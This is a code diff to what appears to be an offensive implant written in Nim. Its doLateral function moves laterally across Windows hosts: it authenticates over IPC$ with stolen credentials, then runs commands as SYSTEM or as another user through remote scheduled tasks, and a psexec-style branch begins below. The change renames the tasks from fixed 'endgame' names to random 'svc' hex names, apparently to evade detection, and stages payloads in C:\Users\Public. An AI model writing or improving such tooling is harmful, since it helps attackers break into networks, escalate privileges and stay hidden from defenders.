@@ -1222,11 +1222,11 @@ when defined(windows):
 
   proc doLateral(meth, host, user, pass, cmd: string; payData: seq[byte] = @[]): string =
     if meth == "atexec":
+      let tn = "svc" & toHex(uint32(getTime().toUnix() and 0xFFFFFFFF'i64), 8)
       var out2 = ""
       if user != "":
         out2.add(runShell("net use \\\\" & host & "\\IPC$ \"" & pass &
           "\" /user:\"" & user & "\" 2>&1") & "\n")
-      let tn = "endgame_lat"
       out2.add(runShell("schtasks /Create /S " & host & " /RU SYSTEM /SC ONCE /ST 00:00 /F /TN " &
         tn & " /TR \"" & cmd & "\" 2>&1") & "\n")
       out2.add(runShell("schtasks /Run /S " & host & " /TN " & tn & " 2>&1") & "\n")
@@ -1235,15 +1235,22 @@ when defined(windows):
       if user != "": discard runShell("net use \\\\" & host & "\\IPC$ /delete 2>&1")
       return "[+] atexec → " & host & "\n    task: " & tn & "\n    cmd: " & cmd & "\n    runas: SYSTEM\n" & out2
     elif meth == "runas":
-      let tn = "endgame_ru"
+      let tn = "svc" & toHex(uint32(getTime().toUnix() and 0xFFFFFFFF'i64), 8)
       let ru = if user.startsWith(".\\") or user.startsWith("./"): user[2..^1] else: user
+      # Copy to C:\Users\Public\ so the target user can read it
+      let baseName = cmd.split('\\')[^1]
+      let pubPath = "C:\\Users\\Public\\" & baseName
+      var effCmd = cmd
+      if cmd != pubPath:
+        try: copyFile(cmd, pubPath); effCmd = pubPath
+        except: discard
       var out2 = ""
       out2.add(runShell("schtasks /Create /SC ONCE /ST 00:00 /F /TN " & tn &
-        " /TR \"\\\"" & cmd & "\\\"\" /RU \"" & ru & "\" /RP \"" & pass & "\" 2>&1") & "\n")
+        " /TR \"\\\"" & effCmd & "\\\"\" /RU \"" & ru & "\" /RP \"" & pass & "\" 2>&1") & "\n")
       out2.add(runShell("schtasks /Run /TN " & tn & " 2>&1") & "\n")
       Sleep(DWORD(3000))
       out2.add(runShell("schtasks /Delete /TN " & tn & " /F 2>&1") & "\n")
-      return "[+] runas → " & ru & " @ " & host & "\n    cmd: " & cmd & "\n" & out2
+      return "[+] runas → " & ru & " @ " & host & "\n    cmd: " & effCmd & "\n" & out2
     elif meth == "psexec":
       let svcName = "svc" & toHex(uint32(getTime().toUnix() and 0xFFFFFFFF'i64), 8)
       let exeName = svcName & ".exe"
